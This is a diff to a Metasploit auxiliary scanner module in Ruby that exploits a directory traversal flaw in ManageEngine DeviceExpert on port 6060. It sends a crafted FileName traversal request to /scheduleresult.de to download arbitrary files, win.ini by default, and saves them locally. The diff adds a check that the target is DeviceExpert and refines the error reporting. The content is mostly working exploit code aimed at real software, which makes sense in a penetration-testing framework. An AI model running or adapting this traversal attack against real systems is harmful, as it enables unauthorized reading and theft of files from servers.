@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
@@ -23,8 +20,7 @@ class Metasploit3 < Msf::Auxiliary
       },
       'References'     =>
         [
-          [ 'OSVDB', '80262'],
-          [ 'URL', 'http://retrogod.altervista.org/9sg_me_adv.htm' ]
+          [ 'OSVDB', '80262']
         ],
       'Author'         =>
         [
@@ -40,9 +36,7 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(6060),
         OptBool.new('SSL',   [true, 'Use SSL', true]),
         OptString.new('FILEPATH', [true, 'The name of the file to download', 'windows\\win.ini'])
-      ], self.class)
-
-    deregister_options('RHOST')
+      ])
   end
 
   def run_host(ip)
@@ -50,12 +44,28 @@ class Metasploit3 < Msf::Auxiliary
     filename = datastore['FILEPATH']
 
     res = send_request_raw({
+      'uri' => "/scheduleresult.de",
+      'method' => 'GET'
+    }, 25)
+
+    if res && res.code != 200
+      print_error("Target is not ManageEngine DeviceExpert")
+      return
+    end
+
+    res = send_request_raw({
       'uri' => "/scheduleresult.de/?FileName=#{traverse}#{filename}",
       'method' => 'GET'
     }, 25)
 
     if res
-      print_status("#{ip}:#{rport} returns: #{res.code.to_s}")
+      case res.code
+      when 200
+        print_status("#{ip}:#{rport} returns: #{res.code.to_s}")
+      when 404
+        print_error("#{ip}:#{rport} - file not found")
+        return
+      end
     else
       print_error("Unable to communicate with #{ip}:#{rport}")
       return
@@ -72,8 +82,7 @@ class Metasploit3 < Msf::Auxiliary
         res.body,
         fname)
 
-      print_status("#{ip}:#{rport} - File saved in: #{path}")
+      print_good("#{ip}:#{rport} - File saved in: #{path}")
     end
   end
-
 end
